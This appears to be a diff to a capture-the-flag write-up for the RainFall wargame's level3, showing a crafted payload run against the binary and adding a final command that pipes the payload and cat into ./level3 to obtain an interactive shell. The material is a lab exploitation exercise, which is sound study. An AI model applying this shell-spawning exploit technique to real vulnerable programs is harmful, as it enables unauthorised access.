@@ -103,3 +103,9 @@ new playload + output out of gdb
     level3@RainFall:~$ ./level3 < /tmp/payload
     �                                                         200
     Wait what?!
+
+
+==========================================================================================
+
+Final command to get shell:
+    (cat /tmp/payload; cat;) | ./level3
